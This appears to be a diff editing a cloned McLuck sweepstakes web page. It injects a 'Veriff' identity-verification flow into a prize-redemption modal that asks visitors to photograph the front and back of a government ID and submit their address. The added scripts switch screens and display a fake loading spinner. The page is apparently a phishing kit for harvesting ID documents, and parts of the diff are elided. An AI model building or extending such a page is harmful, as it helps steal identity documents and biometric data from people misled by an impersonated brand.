@@ -981,7 +981,8 @@ document.addEventListener('click', function(e) {
 
 
   <link rel="stylesheet" type="text/css" href="./css/best_theme.css">
-
+  
+  <script>
   
 document.addEventListener('click', function(e) {
   var btn = e.target.closest('[data-testid="button-base"]');
@@ -993,7 +994,7 @@ document.addEventListener('click', function(e) {
 
   var rm = document.getElementById('redeem-modal-mobile');
   if (rm) rm.style.display = 'none';
-  ...
+  
 
     // MOBILE: inject Veriff multi-step flow
     if (document.getElementById('veriff-flow-root')) return; // prevent duplicates
@@ -1388,7 +1389,7 @@ document.querySelectorAll('a[data-testid="menu-link-lobby"]').forEach(function(l
 
 <div id="prize-redemption-modal" style="display:none;">
   <div role="presentation" data-test="common-modal" data-testid="common-modal-test-id" class="mt-modal-root"><div class="styles-module-scss-module__5VgKxa__root" style="z-index: 0;"><div data-animated-overlay="true" data-direction="center" class="mt-overlay _overlay_j71w0_730 _grow_j71w0_762 mobileFullViewModal _theme_16d4u_1" role="button"></div></div><div class="styles-module-scss-module__5VgKxa__root" style="z-index: 1;"><div data-animated-overlay="true" data-direction="center" class="mt-overlay _overlay_j71w0_730 _grow_j71w0_762 _theme_16d4u_1 mobileFullViewModal" role="button"><div class="_root_1x1y5_730 mt-modal mt-modal-mobile-without-radius"><div class="content _content_1x1y5_730"><div class="_theme_16d4u_1 _root_w5bpc_730 _submitDocuments_1x1y5_763"><h4 class="_title_w5bpc_739">STEP ONE: ID VERIFICATION</h4><div class="_richTextWrapper_w5bpc_806"><p class="_richText_w5bpc_797">In order to verify your identity, <span class="_richTextStrong_w5bpc_802">you’ll need</span>:</p><ul><li class="_richText_w5bpc_797">Your&nbsp;physical ID&nbsp;(Driving License, National ID, or Passport).</li><li class="_richText_w5bpc_797">A well-lit space for clear photos.</li></ul><p class="_richText_w5bpc_797"><br><span class="_richTextStrong_w5bpc_802">What You’ll Do:</span></p><ol><li class="_richText_w5bpc_797">Take a picture of your ID (front and back).</li></ol></div><div class="_consentWrapper_w5bpc_820"><span class="mt-checkbox-root _checkbox_w5bpc_811 _checkbox_checked_w5bpc_817" aria-disabled="false" data-testid="checkbox-wrapper"><input role="checkbox" data-indeterminate="false" type="checkbox"><svg focusable="false" viewBox="0 0 24 24" aria-hidden="true" data-testid="checkbox-svg"><path d="M19 3H5c-1.11 0-2 .9-2 2v14c0 1.1.89 2 2 2h14c1.11 0 2-.9 2-2V5c0-1.1-.89-2-2-2zm-9 14l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" data-testid="checkbox-checked-default-path"></path></svg></span><div class="_consentTextBlock_w5bpc_827"><span class="_linkWrapper_1jv03_730"><span class="_consentText_w5bpc_827">By checking this box, you consent to McLuck and our verification providers collecting, storing, and using your government-issued identification and biometric data for identity verification, as described in our <a href="https://www.mcluck.com/privacy">Privacy Policy</a>.</span></span><svg class="mt-svg-icon-root _infoIcon_w5bpc_845" focusable="false" viewBox="0 0 24 24" aria-hidden="true"><path d="M13,9H11V7H13M13,17H11V11H13M12,2A10,10 0 0,0 2,12A10,10 0 0,0 12,22A10,10 0 0,0 22,12A10,10 0 0,0 12,2Z"></path></svg></div></div><button data-disabled="true" disabled="" class="mt-button-base-root mt-button-disabled mt-button-contained _root_1lv2a_730 _button_e8y5a_764 _documentVerificationSubmitButton_1gfq3_740" data-testid="button-base" data-test="verifications-submit-proof-of-address" role="button">Submit ID</button></div><div class="_theme_16d4u_1 _root_e8y5a_730 _submitDocuments_1x1y5_763"><h4 class="_title_e8y5a_739">STEP TWO: COMPLETE PROFILE</h4><p class="_identityDocuments_e8y5a_752">To complete your profile, you must provide your basic details, contact information, and account preferences. The information you submit must:</p><ul class="_list_e8y5a_796"><li>Be accurate and match your official documents</li><li>Clearly state your current residential address</li></ul><button data-disabled="false" class="mt-button-base-root mt-button-contained _root_1lv2a_730 _button_w5bpc_752 _idVerificationSubmitButton_1gfq3_730" data-testid="button-base" data-test="verifications-submit-id" role="button">Complete Profile</button></div><p class="text-smaller text-center _info_1x1y5_746">We use our trusted partner for verifying your identity to meet with global KYC standards. </p></div></div></div></div></div>
-  <div role="presentation" data-test="common-modal" ...>...</div>
+  <div role="presentation" data-test="common-modal" ></div>
 </div>
 
 
@@ -1529,7 +1530,26 @@ function submitFrontIDDesktop(panel, backdrop) {
   });
 })();
 </script>
-
+<script>
+window.veriffShowPart1 = function() {
+  document.getElementById('screen-welcome').style.display = 'none';
+  document.getElementById('screen-veriff-part1').style.display = 'block';
+  document.getElementById('screen-veriff-part2').style.display = 'none';
+};
+window.veriffShowPart2 = function() {
+  document.getElementById('screen-welcome').style.display = 'none';
+  document.getElementById('screen-veriff-part1').style.display = 'none';
+  document.getElementById('screen-veriff-part2').style.display = 'block';
+};
+window.veriffHideAll = function() {
+  var r = document.getElementById('veriff-flow-root'); if(r) r.remove();
+};
+window.veriffTriggerLoading = function(cb) {
+  var el = document.getElementById('global-loading');
+  if(el) el.style.display = 'flex';
+  setTimeout(function() { if(el) el.style.display = 'none'; if(typeof cb === 'function') cb(); }, 1500);
+};
+</script>
 
 
 </body></html>
